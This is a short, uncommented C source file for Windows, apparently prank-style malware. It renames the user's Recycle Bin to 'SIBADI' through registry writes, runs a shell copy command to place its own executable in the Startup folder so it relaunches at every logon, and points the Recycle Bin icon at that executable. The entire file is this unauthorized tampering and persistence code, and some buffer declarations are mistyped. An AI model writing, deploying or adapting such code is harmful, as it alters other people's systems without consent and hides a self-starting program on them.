#include <Windows.h>
#include <Shlobj.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]){
    HKEY recycleBinHKey;
    LPCSTR registrySubkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}";
    const BYTE * pnewValue = (const BYTE *) "SIBADI";
    RegOpenKeyExA(HKEY_CURRENT_USER, registrySubkey, 0, KEY_SET_VALUE, &recycleBinHKey);
    RegSetValueExA(recycleBinHKey, NULL, 0, REG_SZ, pnewValue, strlen(pnewValue));
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSHNOWAIT, NULL, NULL);
    RegCloseKey(recycleBinHKey);

    const char* command[345];
    char filename[MAX_PATH];
    GetModuleFileName(NULL, filename, MAX_PATH);
    char* exename = strrchr(filename, '\\');
    if (exename != NULL) {
        exename++;
    } else {
        exename = filename;
    }

    sprintf(command, "copy \"%s\" \"%%USERPROFILE%%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", exename);
    system(command);
    LPCSTR iconRegistryKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon";
    const char* iconPath[256];
    HKEY recycleBinIconHKey;
    sprintf(iconPath, "%%USERPROFILE%%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s,-2", exename);
    RegOpenKeyExA(HKEY_CURRENT_USER, iconRegistryKey, 0, KEY_SET_VALUE, &recycleBinIconHKey);
    RegSetValueExA(recycleBinIconHKey, "full", 0, REG_EXPAND_SZ, (const BYTE*)iconPath, strlen(iconPath));
    RegSetValueExA(recycleBinIconHKey, "empty", 0, REG_EXPAND_SZ, (const BYTE*)iconPath, strlen(iconPath));
    RegSetValueExA(recycleBinIconHKey, NULL, 0, REG_EXPAND_SZ, (const BYTE*)iconPath, strlen(iconPath));
    RegCloseKey(recycleBinIconHKey);
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSHNOWAIT, NULL, NULL);
    return 0;
}
